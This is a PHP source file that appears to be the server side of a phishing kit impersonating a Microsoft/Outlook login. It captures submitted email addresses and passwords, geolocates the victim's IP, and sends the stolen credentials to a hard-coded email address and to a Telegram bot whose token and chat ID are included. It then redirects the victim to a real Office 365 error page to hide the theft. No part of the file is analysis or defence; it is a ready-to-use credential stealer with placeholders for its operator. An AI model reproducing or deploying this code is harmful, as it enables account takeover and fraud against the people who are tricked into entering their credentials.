<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$browser = $_SERVER['HTTP_USER_AGENT'];
$country = ip_visitor_country();
$region = ip_visitor_region();
$city = ip_visitor_city();
$adddate=date("D M d, Y g:i a");

$email = trim($_POST['email']);
$password = trim($_POST['password']);

if($email != null && $password != null){

$message .= "E -- $email\n";
$message .= "P -- $password\n";
$message .= "IP --  ".$ip."\n";
$message .= "Country --  ".$country."\n";
$message .= "Country --  ".$region."\n";
$message .= "City --  ".$city."\n";
$message .= "Date --  ".$adddate."\n";
$message .= "Browser --  ".$browser."\n";

  $subject = "Log from $city";
  $email = "sendjunks00@mailfence.com";  //[YOUR LOG EMAIL GOES HERE]
  header("Location: https://outlook.office365.com/Encryption/ErrorPage.aspx?src=3&code=11&be=SN6PR04MB4014&fe=JNAP275CA0040.ZAFP275.PROD.OUTLOOgK.COM&loc=en-US&itemID=E4E_M_e9df154a-e4b8-4486-8aec-7acceeb93fee");
  @mail($email,$subject,$message);
  
 $chat_id = "6685077012";  //[YOUR TELEGRAM BOT CHAT ID GOES HERE]
 $bot_url = "6549346469:AAG3wBJCbLoIwwmZay5kqTw025GfN1BGEzU";  //[YOUR TELEGRAM BOT TOKEN GOES HERE]
 $txt = $message;
    $send = ['chat_id'=>$chat_id,'text'=>$txt];
    $website_telegram = "https://api.telegram.org/bot{$bot_url}";
    $ch = curl_init($website_telegram . '/sendMessage');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $result = curl_exec($ch);
    curl_close($ch);
	
	$signal = 'ok';
	$msg = 'InValid Credentials';
 
 }
else{
	$signal = 'Sorry, but we’re having trouble signing you in.';
	$msg = 'Please fill in all the fields.';
}
$data = array(
        'signal' => $signal,
        'msg' => $msg
    );
    echo json_encode($data);
 

function ip_visitor_country()
{

    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $country  = "Unknown";

    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "http://www.geoplugin.net/json.gp?ip=".$ip);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
    $ip_data_in = curl_exec($ch); // string
    curl_close($ch);

    $ip_data = json_decode($ip_data_in,true);
    $ip_data = str_replace('&quot;', '"', $ip_data); // for PHP 5.2 see stackoverflow.com/questions/3110487/

    if($ip_data && $ip_data['geoplugin_countryName'] != null) {
        $country = $ip_data['geoplugin_countryName'];
  
  
    }

    return $country;
}

//echo ip_visitor_country(); // output Country name


// Function to get REGION;
function ip_visitor_region()
{

    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $region  = "Unknown";

    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "http://www.geoplugin.net/json.gp?ip=".$ip);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
    $ip_data_in = curl_exec($ch); // string
    curl_close($ch);

    $ip_data = json_decode($ip_data_in,true);
    $ip_data = str_replace('&quot;', '"', $ip_data); // for PHP 5.2 see stackoverflow.com/questions/3110487/

    if($ip_data && $ip_data['geoplugin_region'] != null) {
      $region = $ip_data['geoplugin_region'];
  
    }

    return $region;
}

// Function to get city;
function ip_visitor_city()
{

    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $city  = "Unknown";

    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "http://www.geoplugin.net/json.gp?ip=".$ip);
    curl_setopt($ch, CURLOPT_HEADER, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);
    $ip_data_in = curl_exec($ch); // string
    curl_close($ch);

    $ip_data = json_decode($ip_data_in,true);
    $ip_data = str_replace('&quot;', '"', $ip_data); // for PHP 5.2 see stackoverflow.com/questions/3110487/

    if($ip_data && $ip_data['geoplugin_city'] != null) {
      $city = $ip_data['geoplugin_city'];
  
    }

    return $city;
}

//echo ip_visitor_city(); // output city name
?>